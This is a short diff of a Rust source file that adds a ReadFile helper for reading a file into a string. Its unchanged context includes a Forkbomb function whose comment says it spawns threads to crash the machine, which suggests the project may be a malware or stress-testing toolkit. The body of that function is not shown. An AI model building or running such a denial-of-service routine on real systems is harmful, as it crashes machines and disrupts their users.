@@ -1,5 +1,5 @@
 mod linux;
-use std::path::Path;
+use std::{path::Path, fs};
 use rand::Rng;
 
 // Revert returns a reversed string.
@@ -77,6 +77,13 @@ fn RandomString(n: usize) -> String {
 
 	return b
 	}
+
+// ReadFile is used to read a given file and return its data as a string.
+fn ReadFile(filename: String) -> Result<String, std::io::Error>  {
+        let b = fs::read_to_string(filename);
+        return b
+        }
+
 
 // Forkbomb spawns threads in order to crash the machine.
 fn Forkbomb() {
